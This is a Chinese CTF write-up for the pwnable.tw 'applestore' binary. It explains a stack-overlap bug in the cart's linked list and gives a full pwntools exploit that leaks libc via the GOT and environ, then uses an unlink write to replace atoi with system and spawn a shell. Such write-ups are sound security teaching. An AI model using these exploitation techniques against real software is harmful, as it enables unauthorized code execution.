## apple store

### 题目分析

整道题目除了输入数字就没有其他的输入了，所以只能在这些数字输入上找洞。可以添加，删除，和打印手机类型，但是这些函数都不需要你来输入，手机的名称是内置的字符串。但是在进行这些操作时会输入一些数字和字母，按理来说输入这些东西只需要开0x8个字节的缓冲区就够了，题目一下子开了0x15个字节的缓冲区一看就有问题。

另外，checkout函数在总销售额达到7174的时候，会在==栈上而不是堆上==创建一个销售记录并且插入链表中。

### 漏洞分析

因为这些所有的操作函数（add,show,delete）函数都是在handler这个函数中被调用，所以在调用时这些函数的ebp都是相同的。checkout函数会在栈上ebp - 0x20的地方申请一个note插入表中。而delete和show函数，的输入函数缓冲区也恰好开在 ebp - 0x22的地方，所以delete和show函数的输入恰好可以覆盖掉note中的内容。这就是漏洞所在。

```c
  phone v2; // [esp+18h] [ebp-20h] BYREF    note的位置
  unsigned int v3; // [esp+2Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf((char **)&v2, "%s", "iPhone 8");
    v2.size = 1;
    insert(&v2);
    v1 = 7175;
  }
--------------------------------------------------------------------------------------nsigned int delete()
{
  int count; // [esp+10h] [ebp-38h]
  phone *note_ptr_; // [esp+14h] [ebp-34h]
  int idx; // [esp+18h] [ebp-30h]
  phone *next_ptr; // [esp+1Ch] [ebp-2Ch]
  phone *prev_ptr; // [esp+20h] [ebp-28h]
  char nptr[22]; // [esp+26h] [ebp-22h] BYREF  buffer的位置，正好覆盖note！！！！
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  count = 1;
  note_ptr_ = (phone *)begin_;
  printf("Item Number> ");
  fflush(stdout);
  my_read(nptr, 0x15u)
  ......
}
```

### 漏洞利用

```c
00000000 phone           struc ; (sizeof=0x10, mappedto_7)
00000000 name            dd ?
00000004 size            dd ?
00000008 next_ptr        dd ?
0000000C prev_ptr        dd ?
00000010 phone           ends
```

note的结构如上所示，其中name中保存的是一个指向str的ptr，这个str在show的时候会被打印出来。如果把这个ptr覆盖成got的地址就可以进行泄露。

另外来看一下delete的具体操作。

```c
cwhile ( note_ptr_ )
  {
    if ( count == idx )
    {
      next_ptr = (phone *)note_ptr_->next_ptr;
      prev_ptr = (phone *)note_ptr_->prev_ptr;
      if ( prev_ptr )
        prev_ptr->next_ptr = (int)next_ptr;
      if ( next_ptr )
        next_ptr->prev_ptr = (int)prev_ptr;
      printf("Remove %d:%s from your shopping cart.\n", count, (const char *)note_ptr_->name);
      return __readgsdword(0x14u) ^ v7;
    }
    ++count;
    note_ptr_ = (phone *)note_ptr_->next_ptr;
  }
```

delete一个note只不过是将他从链表中取下来，并没有清空指针。在清空的过程中可以使用unlink的技巧，将prev_ptr修改为目标地址 - 0x10，就可以将next_ptr覆盖到目标地址，而next_ptr也是可以控制的，所以就可以任意地址写一个地址。利用这个漏洞将atoli的got表修改为system就可以拿到shell。

### EXP：

```python
#coding=utf-8
from pwn import *
local = 0
exec_file="./applestore"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10104)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x08048BFD
    b *0x080489E0
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def add(idx):
    a.sendlineafter("> ",str(2))
    a.sendlineafter("Device Number> ",str(idx))
    return 

def delete(idx):
    a.sendlineafter("> ",str(3))
    a.sendlineafter("Item Number> ",idx)
    return 
    
def check_out():
    a.sendlineafter("> ",str(5))
    a.sendlineafter("Let me check your cart. ok? (y/n) > ",'y')
    return 
    
def show(payload):
    a.sendlineafter("> ",str(4))
    a.sendlineafter("Let me check your cart. ok? (y/n) > ",payload)
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33

for i in range(6):
    add(1)
for i in range(20):
    add(2)
check_out()
atoi_got = elf.got["atoi"]
payload = "y\x00" + p32(atoi_got)  + p32(0)
show(payload)
a.recvuntil("27: ")
libc_base = u32(a.recv(4)) - libc.sym["atoi"]
fuck(libc_base)#leak libc_base
payload = payload = "y\x00" + p32(libc_base + libc.sym["environ"])  + p32(0)
show(payload)
a.recvuntil("27: " )
stack_addr = u32(a.recv(4)) - 0xc4 -0xc -0x34 -0x8
fuck(stack_addr)

for i in range(19):
    delete(str(7) + '\x00')

payload = "8\x00" + p32(atoi_got) + p32(0)+p32(atoi_got + 0x22) +p32(stack_addr)
#debug()
delete(payload)
payload = p32(libc_base + libc.sym["system"]) + ';' + "/bin/sh\x00"
a.sendlineafter("> ",payload)
a.interactive()
```

